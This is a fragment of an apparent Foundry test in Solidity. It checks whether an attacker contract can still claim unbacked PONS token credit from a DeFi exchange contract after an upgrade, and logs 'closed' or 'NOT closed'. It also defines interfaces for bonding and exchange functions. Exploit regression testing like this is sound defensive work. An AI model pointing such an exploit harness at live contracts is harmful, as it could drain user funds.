        _apply(M_VAULT);
        KsAttacker atk = new KsAttacker(PM, key201d);
        vm.deal(address(atk), 0.01 ether);
        uint256 B0 = IERC20(PONS).balanceOf(SE201D);
        uint256 R = IOldSE(SE201D).reserveOfToken(PONS);
        (, uint256 d1) = IOldSE(SE201D).deployedReserve();
        uint256 fb = R > d1 ? R - d1 : 0;
        uint256 U = B0 > fb ? B0 - fb : 0;
        console2.log("  live U(PONS)", U);
        if (U == 0) return;
        try atk.claimCredit(SE201D, PONS, U, WETH, 1) returns (uint256) {
            console2.log("  PONS credit claim OK (NOT closed)");
        } catch (bytes memory err) {
            console2.log("  PONS credit claim REVERTED (closed)");
            if (err.length >= 4) console2.logBytes4(bytes4(err));
        }
    }
}

interface IBond {
    function bond(address tokenIn, uint256 amountIn, uint256 lockDuration, address recipient, bool pre, uint256 dl)
        external
        returns (uint256 tokenId, uint256 shares);
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external
        returns (uint256 amountOut, uint256 amountRefunded);
}

interface IHookV {
    function standardExchange() external view returns (address);
    function rawToken() external view returns (address);
}

interface IOwn {
    function owner() external view returns (address);
}
